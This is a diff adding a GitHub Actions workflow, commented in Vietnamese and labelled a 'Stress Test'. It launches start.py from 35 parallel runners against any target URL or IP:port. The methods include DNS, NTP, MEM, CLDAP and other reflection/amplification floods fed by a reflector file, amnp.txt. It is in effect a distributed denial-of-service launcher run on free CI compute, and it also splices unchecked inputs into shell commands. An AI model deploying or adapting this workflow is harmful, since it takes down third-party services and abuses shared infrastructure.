@@ -1,0 +1,83 @@
+name: Stress Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      layer:
+        description: "Layer (4 hoặc 7)"
+        required: true
+      method:
+        description: "Tên method (ví dụ: GET, POST, DNS, NTP)"
+        required: true
+      target:
+        description: "URL (Layer7) hoặc IP:port (Layer4)"
+        required: true
+      threads:
+        description: "Số threads"
+        default: "200"
+        required: true
+      duration:
+        description: "Thời gian test (giây)"
+        default: "60"
+        required: true
+      rpc:
+        description: "Requests per connection (chỉ Layer7)"
+        default: "50"
+        required: false
+
+jobs:
+  stress:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35]   # 12 job song song
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.x"
+
+      - name: Install dependencies
+        run: |
+          python3 -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then
+            pip install -r requirements.txt
+          fi
+
+      - name: Run Stress Test
+        run: |
+          if [[ "${{ github.event.inputs.layer }}" == "7" ]]; then
+            # Layer7: không dùng proxy (để trống)
+            python3 start.py \
+              ${{ github.event.inputs.method }} \
+              ${{ github.event.inputs.target }} \
+              5 \
+              ${{ github.event.inputs.threads }} \
+              "" \
+              ${{ github.event.inputs.rpc }} \
+              ${{ github.event.inputs.duration }}
+          elif [[ "${{ github.event.inputs.layer }}" == "4" ]]; then
+            case "${{ github.event.inputs.method }}" in
+              DNS|NTP|MEM|CLDAP|ARD|RDP|CHAR)
+                python3 start.py \
+                  ${{ github.event.inputs.method }} \
+                  ${{ github.event.inputs.target }} \
+                  ${{ github.event.inputs.threads }} \
+                  ${{ github.event.inputs.duration }} \
+                  amnp.txt
+                ;;
+              *)
+                python3 start.py \
+                  ${{ github.event.inputs.method }} \
+                  ${{ github.event.inputs.target }} \
+                  ${{ github.event.inputs.threads }} \
+                  ${{ github.event.inputs.duration }}
+                ;;
+            esac
+          else
+            echo "⚠️ Layer phải là 4 hoặc 7"
+            exit 1
+          fi
